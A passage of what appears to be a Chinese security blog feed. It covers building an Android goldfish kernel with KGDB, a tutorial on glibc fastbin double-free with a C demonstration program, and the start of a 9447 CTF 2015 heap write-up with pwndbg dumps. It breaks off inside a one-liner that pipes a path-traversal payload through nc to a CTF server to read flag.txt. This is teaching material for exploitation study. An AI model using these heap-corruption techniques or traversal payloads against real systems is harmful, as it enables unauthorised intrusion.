class="line">/home/sakura/arm-eabi-4.6/bin:/home/sakura/Android/Sdk/platform-tools:/usr/local/java/jdk1.6.0_45/bin:/usr/local/java/jdk1.6.0_45/jre/bin:/usr/local/java/jdk1.6.0_45:/home/sakura/Android/Sdk/platform-tools:/usr/local/java/jdk1.6.0_45/bin:/usr/local/java/jdk1.6.0_45/jre/bin:/usr/local/java/jdk1.6.0_45:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span><br></pre></td></tr></table></figure></p><h2 id="配置编译选项，进行编译"><a href="#配置编译选项，进行编译" class="headerlink" title="配置编译选项，进行编译"></a>配置编译选项，进行编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ export ARCH=arm</span><br><span class="line">sakura@ubuntu:~/goldfish$ export CROSS_COMPILE=arm-eabi-</span><br><span class="line">sakura@ubuntu:~/goldfish$ export SUBARCH=arm</span><br><span class="line">sakura@ubuntu:~/goldfish$ make goldfish_armv7_defconfig</span><br><span class="line">  HOSTCC  scripts/basic/fixdep</span><br><span class="line">  HOSTCC  scripts/kconfig/conf.o</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.tab.c</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.lex.c</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.hash.c</span><br><span class="line">  HOSTCC  scripts/kconfig/zconf.tab.o</span><br><span class="line">  HOSTLD  scripts/kconfig/conf</span><br><span class="line">#</span><br><span class="line"># configuration written to .config</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>增加内核编译选项,修改goldfish/.config配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ vim /home/sakura/goldfish/.config</span><br></pre></td></tr></table></figure></p><p>添加以下两行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_DEBUG_INFO=y #显示vmlinux符号</span><br><span class="line">CONFIG_KGDB=y #开启kgdb</span><br></pre></td></tr></table></figure></p><p>执行 make 命令进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ make</span><br></pre></td></tr></table></figure></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>编译成功后会显示<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-03-165239.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OBJCOPY arch/arm/boot/Image</span><br><span class="line">Kernel: arch/arm/boot/Image is ready</span><br><span class="line">AS      arch/arm/boot/compressed/head.o</span><br><span class="line">GZIP    arch/arm/boot/compressed/piggy.gzip</span><br><span class="line">AS      arch/arm/boot/compressed/piggy.gzip.o</span><br><span class="line">CC      arch/arm/boot/compressed/misc.o</span><br><span class="line">CC      arch/arm/boot/compressed/decompress.o</span><br><span class="line">CC      arch/arm/boot/compressed/string.o</span><br><span class="line">SHIPPED arch/arm/boot/compressed/lib1funcs.S</span><br><span class="line">AS      arch/arm/boot/compressed/lib1funcs.o</span><br><span class="line">SHIPPED arch/arm/boot/compressed/ashldi3.S</span><br><span class="line">AS      arch/arm/boot/compressed/ashldi3.o</span><br><span class="line">LD      arch/arm/boot/compressed/vmlinux</span><br><span class="line">OBJCOPY arch/arm/boot/zImage</span><br><span class="line">Kernel: arch/arm/boot/zImage is ready</span><br></pre></td></tr></table></figure></p><p>以指定的内核启动模拟器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -verbose -show-kernel -kernel ~/goldfish/arch/arm/boot/zImage</span><br></pre></td></tr></table></figure></p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>输入emulator的时候报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">No command &apos;emulator&apos; found, did you mean:</span><br><span class="line"> Command &apos;qemulator&apos; from package &apos;qemulator&apos; (universe)</span><br><span class="line">emulator: command not found</span><br></pre></td></tr></table></figure></p><p>我至今不知道为什么经常emulator就没了。。但是只要输入lunch,然后再make一下，几分钟就好了……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载源代码&quot;&gt;&lt;a href=&quot;#下载源代码&quot; class=&quot;headerlink&quot; title=&quot;下载源代码&quot;&gt;&lt;/a&gt;下载源代码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://source.android.com/source/building-kernel
      
    
    </summary>
    
      <category term="Android漏洞分析基础" scheme="http://eternalsakura13.com/categories/Android%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Fastbin Double Free</title>
    <link href="http://eternalsakura13.com/2018/03/02/fastbin/"/>
    <id>http://eternalsakura13.com/2018/03/02/fastbin/</id>
    <published>2018-03-02T02:11:08.252Z</published>
    <updated>2018-03-05T12:09:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastbin-Double-Free原理"><a href="#Fastbin-Double-Free原理" class="headerlink" title="Fastbin Double Free原理"></a>Fastbin Double Free原理</h1><h2 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h2><p>fastbins 划分为10个，其中每一个bins都是一个单向链表，并在链表首部进行插入和删除操作(先进后出)。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-120518.jpg" alt=""><br>对于SIZE_SZ为4B的平台，小于64B的chunk分配请求，对于SIZE_SZ为8B的平台，小于128B的chunk分配请求。首先会查找fast bins中是否有所需大小的chunk存在(精确匹配)，如果存在，就直接返回。</p><p>默认情况下，fast bins 只 cache 了 small bins 的前 7 个大小的空闲 chunk，也就是说:</p><ul><li>对于SIZE_SZ为4B的平台，fast bins有7个chunk空闲链表(bin)，每个 bin的chunk大小依次为16B，24B，32B，40B，48B，56B，64B;<strong>但是其可以支持的chunk的数据空间最大为80字节。</strong></li><li>对于SIZE_SZ为8B的平台，fast bins有7个chunk空闲链表(bin)，每个bin的chunk大小依次为32B，48B，64B，80B，96B，112B，128B;<strong>但是其可以支持的chunk的数据空间最大为160字节。</strong><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>ubuntu14.04 x86_64<br>pwndbg:<a href="https://github.com/pwndbg/pwndbg#readme" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg#readme</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-021235.jpg" alt=""></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放资源超过两次可能导致内存泄漏（memory leaks）<br>以上代码是在fastbins进行的double-free攻击</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.先malloc()三次，产生三个chunk（堆块）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-023120.png" alt=""><br><strong>note:为什么malloc(8)，实际上分配32个字节？</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE \</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req) \</span></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \ </span><br><span class="line">MINSIZE : \ </span><br><span class="line">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></p><p>32位上SIZE_SZ为4字节，64位上为8字节。<br>MALLOC_ALIGN_MASK等于2 <em> SIZE_SZ。<br>MIN_CHUNK_SIZE 定义了最小的 chunk 的大小，32 位平台上为 16 字节，64 位平台为 24 字节或是 32 字节。MINSIZE 定义了最小的分配的内存大小，是对 MIN_CHUNK_SIZE 进行了 2 </em> SIZE_SZ 对齐，地址对齐后与 MIN_CHUNK_SIZE 的大小仍然是一样的。<br>2.打印出返回给用户的堆指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-023940.jpg" alt=""><br><strong>note:为什么返回给用户的指针比chunk的首地址大0x10个字节？</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-024129.png" alt=""><br>因为返回的是mem，而不是chunk<br>3.free掉第一块内存<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-024208.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br></pre></td></tr></table></figure></p><p>如果我们再free(a)的话,程序就会崩溃.因为这块内存刚好在对应free-list（fastbins）的首部,再次free这块内存的时候就会被检查到.</p><p><strong>note:我们触发了什么检查？</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-024322.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (*fb == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (*fb != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;fd = *fb;</span><br><span class="line">    *fb = p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>4.所以我们释放另一块chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure></p><p>fastbin是在链表的首部进行插入删除，所以现在的首部是chunk2(b)了<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-025117.jpg" alt=""><br>5.再次释放a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure></p><p>现在，a已经不在首部了，所以当我们再次free(a)就不会触发检查了！！！<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-02-025219.jpg" alt=""><br>6.double free<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure></p><p>现在有两个指针指向同一块内存，任何一个改变就会影响另一个。</p><h1 id="9447-CTF-2015-writeup"><a href="#9447-CTF-2015-writeup" class="headerlink" title="9447 CTF 2015 writeup"></a>9447 CTF 2015 writeup</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine</a></p><h3 id="系统和工具"><a href="#系统和工具" class="headerlink" title="系统和工具"></a>系统和工具</h3><p>ubuntu14.04,pwndbg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec search </span><br><span class="line">[*] '/home/sakura/search'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x0000000000400D7E</span><br><span class="line">输入AAA SSSS,BBB SSSS,CCC SSSS</span><br><span class="line">pwndbg&gt; x /60gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x53535353204141410x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000031</span><br><span class="line">0x603030:0x00000000006030100x0000000000000003</span><br><span class="line">0x603040:0x00000000006030100x0000000000000008</span><br><span class="line">0x603050:0x00000000000000000x0000000000000031</span><br><span class="line">0x603060:0x00000000006030140x0000000000000004</span><br><span class="line">0x603070:0x00000000006030100x0000000000000008</span><br><span class="line">0x603080:0x00000000006030300x0000000000000021</span><br><span class="line">0x603090:0x53535353204242420x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000031</span><br><span class="line">0x6030b0:0x00000000006030900x0000000000000003</span><br><span class="line">0x6030c0:0x00000000006030900x0000000000000008</span><br><span class="line">0x6030d0:0x00000000006030600x0000000000000031</span><br><span class="line">0x6030e0:0x00000000006030940x0000000000000004</span><br><span class="line">0x6030f0:0x00000000006030900x0000000000000008</span><br><span class="line">0x603100:0x00000000006030b00x0000000000000021</span><br><span class="line">0x603110:0x53535353204343430x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000000031</span><br><span class="line">0x603130:0x00000000006031100x0000000000000003</span><br><span class="line">0x603140:0x00000000006031100x0000000000000008</span><br><span class="line">0x603150:0x00000000006030e00x0000000000000031</span><br><span class="line">0x603160:0x00000000006031140x0000000000000004</span><br><span class="line">0x603170:0x00000000006031100x0000000000000008</span><br><span class="line">0x603180:0x00000000006031300x0000000000020e81</span><br><span class="line">0x603190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031d0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /x 0x00000000006020B8</span><br><span class="line">0x6020b8:0x0000000000603160</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Enter the word size:</span><br><span class="line">4</span><br><span class="line">Enter the word:</span><br><span class="line">SSSS</span><br><span class="line">Found 8: CCC SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">Found 8: BBB SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">Found 8: AAA SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /60gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x00000000006030800x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000031</span><br><span class="line">0x603030:0x00000000006030100x0000000000000003</span><br><span class="line">0x603040:0x00000000006030100x0000000000000008</span><br><span class="line">0x603050:0x00000000000000000x0000000000000031</span><br><span class="line">0x603060:0x00000000006030140x0000000000000004</span><br><span class="line">0x603070:0x00000000006030100x0000000000000008</span><br><span class="line">0x603080:0x00000000006030300x0000000000000021</span><br><span class="line">0x603090:0x00000000006031000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000031</span><br><span class="line">0x6030b0:0x00000000006030900x0000000000000003</span><br><span class="line">0x6030c0:0x00000000006030900x0000000000000008</span><br><span class="line">0x6030d0:0x00000000006030600x0000000000000031</span><br><span class="line">0x6030e0:0x00000000006030940x0000000000000004</span><br><span class="line">0x6030f0:0x00000000006030900x0000000000000008</span><br><span class="line">0x603100:0x00000000006030b00x0000000000000021</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000000031</span><br><span class="line">0x603130:0x00000000006031100x0000000000000003</span><br><span class="line">0x603140:0x00000000006031100x0000000000000008</span><br><span class="line">0x603150:0x00000000006030e00x0000000000000031</span><br><span class="line">0x603160:0x00000000006031140x0000000000000004</span><br><span class="line">0x603170:0x00000000006031100x0000000000000008</span><br><span class="line">0x603180:0x00000000006031300x0000000000000021</span><br><span class="line">0x603190:0x00000000006030000x0000000000000000</span><br><span class="line">0x6031a0:0x00000000000000000x0000000000020e61</span><br><span class="line">0x6031b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031d0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /x 0x00000000006020B8</span><br><span class="line">0x6020b8:0x0000000000603160</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>read_int(sub_400A40)中输入48个字符时，结果不会以null结尾，从而允许leak stack。</li><li>删除一个句子（通过搜索找到它之后）会删除句子内容并释放该句子，但不会删除指向该句子的词语。这会造成UAF(可以通过打印输出来泄漏信息）和一个double free。<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2>writeup<br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search" target="_blank" rel="noopener">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search</a></li></ol><p>##<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~$ python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;A&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;123&quot;&apos;|nc 128.199.224.175 13000</span><br><span class="line">Enter password to authentic yourself : Enter case number:</span><br><span class="line"></span><br><span class="line"> 1) Application_1</span><br><span class="line"> 2) Application_2</span><br><span class="line"> 3) Application_3</span><br><span class="line"> 4) Application_4</span><br><span class="line"> 5) Application_5</span><br><span class="line"> 6) Application_6</span><br><span 